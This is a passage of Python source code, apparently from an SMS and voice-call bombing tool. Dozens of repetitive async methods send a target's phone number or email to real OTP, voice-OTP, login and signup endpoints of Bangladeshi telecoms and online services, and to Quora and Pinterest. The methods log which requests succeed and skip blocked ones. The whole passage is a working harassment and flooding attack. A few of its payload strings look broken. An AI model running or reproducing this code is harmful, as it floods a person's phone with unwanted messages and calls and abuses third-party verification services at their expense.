            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[50 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL50 - Extra API 50", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL50 - Extra API 50", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call51___extra_call_api_51(self):
        api_name = "Call51 - Extra Call 51"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[51 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL51 - Extra API 51", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL51 - Extra API 51", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call52___extra_call_api_52(self):
        api_name = "Call52 - Extra Call 52"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[52 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL52 - Extra API 52", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL52 - Extra API 52", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call53___extra_call_api_53(self):
        api_name = "Call53 - Extra Call 53"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[53 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL53 - Extra API 53", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL53 - Extra API 53", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call54___extra_call_api_54(self):
        api_name = "Call54 - Extra Call 54"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[54 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL54 - Extra API 54", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL54 - Extra API 54", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call55___extra_call_api_55(self):
        api_name = "Call55 - Extra Call 55"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[55 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL55 - Extra API 55", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL55 - Extra API 55", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call56___extra_call_api_56(self):
        api_name = "Call56 - Extra Call 56"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[56 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL56 - Extra API 56", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL56 - Extra API 56", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call57___extra_call_api_57(self):
        api_name = "Call57 - Extra Call 57"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[57 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL57 - Extra API 57", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL57 - Extra API 57", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call58___extra_call_api_58(self):
        api_name = "Call58 - Extra Call 58"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[58 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL58 - Extra API 58", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL58 - Extra API 58", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call59___extra_call_api_59(self):
        api_name = "Call59 - Extra Call 59"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[59 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL59 - Extra API 59", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL59 - Extra API 59", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call60___extra_call_api_60(self):
        api_name = "Call60 - Extra Call 60"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[60 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL60 - Extra API 60", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL60 - Extra API 60", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_call61___extra_call_api_61(self):
        api_name = "Call61 - Extra Call 61"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        # Using a variety of potential endpoints
        endpoints = [
            "https://api.robi.com.bd/vas/v1/otp/send",
            "https://v-app.banglalink.net/api/v1/send-otp",
            "https://www.grameenphone.com/api/v1/otp/send",
            "https://api.airtel.com.bd/vas/v1/otp/send",
            "https://chaldal.com/api/customer/SendVoiceOTP",
            "https://www.foodpanda.com.bd/api/v1/otp/send-voice",
            "https://api.evaly.com.bd/go-auth/api/v1/auth/otp/send-voice",
            "https://api.hungrynaki.com/v1/auth/otp/send-voice"
        ]
        url = endpoints[61 % len(endpoints)]
        try:
            payload = {"phone": target, "msisdn": target, "phoneNumber": target, "type": "voice", "method": "voice"}
            async with self.session.post(url, json=payload, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("CALL61 - Extra API 61", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("CALL61 - Extra API 61", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_email49___quora_signup(self):
        api_name = "Email49 - Quora Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.quora.com/api/v1/auth/signup"
        try:
            async with self.session.post(url, json={"email": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201, 403]
                await self.log_event("EMAIL49 - Quora Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL49 - Quora Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_email50___pinterest_signup(self):
        api_name = "Email50 - Pinterest Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = "https://www.pinterest.com/resource/UserRegisterResource/create/"
        try:
            async with self.session.post(url, data={"email": target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("EMAIL50 - Pinterest Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("EMAIL50 - Pinterest Signup", False, "Error", fmt=current_api_fmt.get())
            return False

    @smart_api
    async def api_api1___redx_signup(self):
        api_name = "Api1 - Redx Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.redx.com.bd:443/v1/user/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"phone":"{phone}"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API1 - RedX Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API1 - RedX Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api2___khaasfood_otp(self):
        api_name = "Api2 - Khaasfood Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.khaasfood.com/api/app/one-time-passwords/token?username={target}".replace("{phone}", target)
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API2 - KhaasFood OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API2 - KhaasFood OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api3___bioscope_login(self):
        target = '+88' + self.target
        url = f"https://api-dynamic.bioscopelive.com/v2/auth/login?country=BD&platform=web&language=en".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API3 - Bioscope Login", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API3 - Bioscope Login", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api4___bikroy_phone_login(self):
        api_name = "Api4 - Bikroy Phone Login"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone={target}".replace("{phone}", target)
        try:
            async with self.session.get(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API4 - Bikroy Phone Login", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API4 - Bikroy Phone Login", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api5___proiojon_signup(self):
        api_name = "Api5 - Proiojon Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://billing.proiojon.com/api/v1/auth/sign-up".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"name":"{randomName}","phone":"{phone}","email":"{randomEmail}","password":"password123","ref_code":"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API5 - Proiojon Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API5 - Proiojon Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api6___beautybooth_signup(self):
        api_name = "Api6 - Beautybooth Signup"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://admin.beautybooth.com.bd/api/v2/auth/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API6 - BeautyBooth Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API6 - BeautyBooth Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api7___medha_otp(self):
        api_name = "Api7 - Medha Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://developer.medha.info/api/send-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API7 - Medha OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API7 - Medha OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api8___deeptoplay_login(self):
        target = '+88' + self.target
        url = f"https://api.deeptoplay.com/v2/auth/login?country=BD&platform=web&language=en".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API8 - Deeptoplay Login", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API8 - Deeptoplay Login", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api9___robi_otp(self):
        api_name = "Api9 - Robi Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://webapi.robi.com.bd/v1/account/register/otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API9 - Robi OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API9 - Robi OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api10___arogga_sms(self):
        api_name = "Api10 - Arogga Sms"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.arogga.com/auth/v1/sms/send/?f=web&b=Chrome&v=122.0.0.0&os=Windows&osv=10".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API10 - Arogga SMS", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API10 - Arogga SMS", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api11___mygp_otp(self):
        api_name = "Api11 - Mygp Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.mygp.cinematic.mobi/api/v1/send-common-otp/88{target}/"
        try:
            async with self.session.post(url, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API11 - MyGP OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API11 - MyGP OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api12___bdstall_otp(self):
        api_name = "Api12 - Bdstall Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://www.bdstall.com/userRegistration/save_otp_info/".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API12 - BDSTall OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API12 - BDSTall OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api13___bcs_exam_otp(self):
        api_name = "Api13 - Bcs Exam Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://bcsexamaid.com/api/generateotp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API13 - BCS Exam OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API13 - BCS Exam OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api14___doctorlive_otp(self):
        api_name = "Api14 - Doctorlive Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)[1:] if self.target.startswith('0') else self.target
        url = f"https://doctorlivebd.com/api/patient/auth/otpsend".replace("{phone}", target)
        try:
            async with self.session.post(url, data={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API14 - DoctorLive OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API14 - DoctorLive OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api15___sheba_otp(self):
        target = '+88' + self.target
        url = f"https://accountkit.sheba.xyz/api/shoot-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{token}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API15 - Sheba OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API15 - Sheba OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api16___apex4u_login(self):
        api_name = "Api16 - Apex4U Login"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.apex4u.com/api/auth/login".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API16 - Apex4U Login", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API16 - Apex4U Login", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api17___sindabad_otp(self):
        target = '+88' + self.target
        url = f"https://offers.sindabad.com/api/mobile-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API17 - Sindabad OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API17 - Sindabad OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api18___kirei_otp(self):
        api_name = "Api18 - Kirei Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://app.kireibd.com/api/v2/send-login-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API18 - Kirei OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API18 - Kirei OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api19___shikho_sms(self):
        api_name = "Api19 - Shikho Sms"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api.shikho.com/auth/v2/send/sms".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API19 - Shikho SMS", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API19 - Shikho SMS", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api20___circle_signup(self):
        target = '+88' + self.target
        url = f"https://reseller.circle.com.bd/api/v2/auth/signup".replace("{phone}", target)
        try:
            async with self.session.post(url, json=json.loads('{"name":"+88{phone}","email_or_phone":"+88{phone}","password":"123456","password_confirmation":"123456","register_by":"phone"}'.replace('{phone}', target).replace('{target}', target).replace('{randomName}', get_random_name()).replace('{randomEmail}', get_random_email()).replace('{randomPhone}', get_random_phone())), headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API20 - Circle Signup", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API20 - Circle Signup", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api21___bdtickets_auth(self):
        target = '+88' + self.target
        url = f"https://api.bdtickets.com:20100/v1/auth".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API21 - BDTickets Auth", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API21 - BDTickets Auth", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api22___grameenphone_otp(self):
        api_name = "Api22 - Grameenphone Otp"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://bkshopthc.grameenphone.com/api/v1/fwa/request-for-otp".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API22 - Grameenphone OTP", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API22 - Grameenphone OTP", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api23___rfl_bestbuy_login(self):
        api_name = "Api23 - Rfl Bestbuy Login"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://rflbestbuy.com/api/login/?lang_code=en&currency_code=BDT".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API23 - RFL BestBuy Login", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API23 - RFL BestBuy Login", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api24___chorki_login(self):
        api_name = "Api24 - Chorki Login"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
        url = f"https://api-dynamic.chorki.com/v1/auth/login?country=BD&platform=mobile".replace("{phone}", target)
        try:
            async with self.session.post(url, json={'phone': target}, headers=self.get_headers(url), timeout=10) as res:
                success = res.status in [200, 201]
                await self.log_event("API24 - Chorki Login", success, res.status, fmt=current_api_fmt.get())
                return success
        except Exception:
            await self.log_event("API24 - Chorki Login", False, "Error", fmt=current_api_fmt.get())
            return False


    @smart_api
    async def api_api25___hishab_express_login(self):
        api_name = "Api25 - Hishab Express Login"
        if self.smart.is_blocked(api_name): return False
        fmt = self.smart.get_format(api_name)
        target = NumberFormatter.format(self.target, fmt)
